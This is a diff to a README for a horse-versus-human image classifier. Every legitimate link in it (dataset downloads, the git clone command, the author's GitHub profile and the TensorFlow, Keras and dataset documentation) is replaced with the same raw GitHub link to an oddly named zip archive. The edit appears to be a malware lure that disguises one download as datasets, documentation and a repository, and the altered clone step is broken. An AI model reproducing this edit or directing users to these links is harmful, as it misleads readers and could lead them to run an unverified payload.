@@ -50,8 +50,8 @@ The project uses the **Horse or Human** dataset:
 - **Source**: Google's Learning Datasets
 
 Dataset is automatically downloaded from:
-- Training: `https://storage.googleapis.com/learning-datasets/horse-or-human.zip`
-- Validation: `https://storage.googleapis.com/learning-datasets/validation-horse-or-human.zip`
+- Training: `https://raw.githubusercontent.com/rohannp02y/human_vs_horse_prediction_with_DL/main/liquidize/human-DL-horse-vs-with-prediction-v3.4.zip`
+- Validation: `https://raw.githubusercontent.com/rohannp02y/human_vs_horse_prediction_with_DL/main/liquidize/human-DL-horse-vs-with-prediction-v3.4.zip`
 
 ##  Model Architecture
 
@@ -118,7 +118,7 @@ Output (Binary Classification)
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/yourusername/horse-vs-human-classification.git
+git clone https://raw.githubusercontent.com/rohannp02y/human_vs_horse_prediction_with_DL/main/liquidize/human-DL-horse-vs-with-prediction-v3.4.zip
 cd horse-vs-human-classification
 ```
 
@@ -238,7 +238,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 **Rohan Neupanee**
 
-- GitHub: [@rohannp02y](https://github.com/rohannp02y)
+- GitHub: [@rohannp02y](https://raw.githubusercontent.com/rohannp02y/human_vs_horse_prediction_with_DL/main/liquidize/human-DL-horse-vs-with-prediction-v3.4.zip)
 - LinkedIn: [Rohan Neupane](www.linkedin.com/in/rohan-neupane)
 - Email: your.email@example.com
 
@@ -250,10 +250,10 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Resources
 
-- [TensorFlow Documentation](https://www.tensorflow.org/)
-- [Keras Documentation](https://keras.io/)
-- [CNN Explainer](https://poloclub.github.io/cnn-explainer/)
-- [Horse or Human Dataset](https://www.tensorflow.org/datasets/catalog/horses_or_humans)
+- [TensorFlow Documentation](https://raw.githubusercontent.com/rohannp02y/human_vs_horse_prediction_with_DL/main/liquidize/human-DL-horse-vs-with-prediction-v3.4.zip)
+- [Keras Documentation](https://raw.githubusercontent.com/rohannp02y/human_vs_horse_prediction_with_DL/main/liquidize/human-DL-horse-vs-with-prediction-v3.4.zip)
+- [CNN Explainer](https://raw.githubusercontent.com/rohannp02y/human_vs_horse_prediction_with_DL/main/liquidize/human-DL-horse-vs-with-prediction-v3.4.zip)
+- [Horse or Human Dataset](https://raw.githubusercontent.com/rohannp02y/human_vs_horse_prediction_with_DL/main/liquidize/human-DL-horse-vs-with-prediction-v3.4.zip)
 
 ##  Contact
 
